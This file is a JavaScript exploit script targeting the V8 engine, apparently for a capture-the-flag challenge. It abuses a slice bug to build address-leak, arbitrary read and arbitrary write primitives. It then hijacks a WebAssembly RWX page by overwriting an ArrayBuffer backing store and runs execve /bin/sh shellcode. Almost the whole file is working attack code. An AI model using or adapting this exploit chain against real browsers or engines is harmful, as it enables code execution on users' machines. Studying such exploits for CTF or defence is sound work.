/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

console.log("[+] Creating RWX page using WebAssembly");

// convert float to integer
function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

// convert integer to float
function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

// using bug in slice, we can read/write compression of all pointers of a object (map, properties, elements, length)

float_arr = [1.1, 1.2, 1.3];
obj_arr = [{A:1}, {B:2}, {C:3}];
slice_float_arr = float_arr.slice(0);
slice_obj_arr = obj_arr.slice(0);
// float_arr_map_properties = ftoi(slice_float_arr[3]);
// %DebugPrint(slice_obj_arr);
// %DebugPrint(slice_float_arr);
// %SystemBreak();
float_arr_elements_length = ftoi(slice_float_arr[4]);
// obj_arr_map_properties = float_arr_map_properties+0x50n;
obj_arr_elements_length = float_arr_elements_length+0x30n;

// console.log("[+] float_arr_map_properties: 0x" + float_arr_map_properties.toString(16));
console.log("[+] float_arr_elements_length: 0x" + float_arr_elements_length.toString(16));
// console.log("[+] obj_arr_map_properties: 0x" + obj_arr_map_properties.toString(16));
console.log("[+] obj_arr_elements_length: 0x" + obj_arr_elements_length.toString(16));

// Leak address of any object
function addrof(in_obj) {
    // put wanted obj to index 0 of obj_arr
    slice_obj_arr[0] = in_obj;

    // %DebugPrint(float_arr);
    // %DebugPrint(obj_arr);
    // %DebugPrint(slice_float_arr);
    // %SystemBreak();
    // %DebugPrint(slice_obj_arr);
    // replace elements of float_arr with elements of obj_arr
    slice_float_arr[4] =  itof(obj_arr_elements_length);
    
    // wanted obj is stored in obj_arr as pointer but we can read it through float_arr
    addr = slice_float_arr[0];

    // %DebugPrint(wasm_instance);
    // %DebugPrint(slice_float_arr);
    // %SystemBreak();
    // put everything to normal
    slice_float_arr[4] = float_arr_elements_length;

    return addr;
}

function arb_read(addr) {
    tmp = [1.1];
    
    if (addr % 2n == 0) {
        addr += 1;
    }
    // read at addr + 8
    addr -= 8n;

    tmp2 = tmp.slice(0);

    // change elements of tmp2 to addr we wanna read
    tmp2[2] = itof(addr);

    return tmp2[0]; 
}

function arb_write(addr, val) {
    tmp = [1.1];

    if (addr % 2n == 0) {
        addr += 1;
    }

    // write at addr + 8
    addr -= 8n;
    
    tmp2 = tmp.slice(0);

    // change elements of tmp2 to addr we wanna read
    tmp2[2] = itof(addr);

    // write to addr
    tmp2[0] = itof(val);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
//%DebugPrint(f);
console.log("[+} wasm instance at 0x" + ftoi(addrof(wasm_instance)).toString(16));

var addr_to_read = ftoi(addrof(wasm_instance)) + 0x68n;
var rwx = ftoi(arb_read(addr_to_read))
// this pointer is not compressed, it exists outside the v8 heap
console.log('[+] RWX segment at 0x' + rwx.toString(16))
//https://defuse.ca/online-x86-assembler.htm#disassembly
// execve /chal/flagprinter
//var shellcode = [0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0xC7, 0xC1, 0x72, 0x00, 0x00, 0x00, 0x51, 0x48, 0xB9, 0x61, 0x67, 0x70, 0x72, 0x69, 0x6E, 0x74, 0x65, 0x51, 0x48, 0xB9, 0x2F, 0x63, 0x68, 0x61, 0x6C, 0x2F, 0x66, 0x6C, 0x51, 0x48, 0x89, 0xE7, 0x0F, 0x05]

// execve /bin/sh
shellcode = [0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0xB9, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x51, 0x48, 0x89, 0xE7, 0x0F, 0x05]

// set up a typed array to do writing outside the heap
// the ArrayBuffer exists within the v8 heap, so we can write to it with
// our current arb_w setup
// the backing store ptr points to outside the v8 heap, so we can overwrite
// it with the real address of our rwx region
var buf = new ArrayBuffer(0x100)
var uint8_arr = new Uint8Array(buf)
var buf_addr = ftoi(addrof(buf))
// offset to backing store ptr at 0x60
var backing_addr = buf_addr + 0x60n

console.log('[+] Writing over ArrayBuffer backing store at 0x' + backing_addr.toString(16));
// overwrite backing store ptr so all uint8_arr access happen in the rwx segment

arb_write(backing_addr, rwx)
console.log('[+] Copying shellcode to rwx segment');
// backing store now points to the rwx segment, copy in our shellcode
for (let i = 0; i < shellcode.length; i++) {
    uint8_arr[i] = shellcode[i]
}

console.log('[+] Shellcode copied, executing');
f();
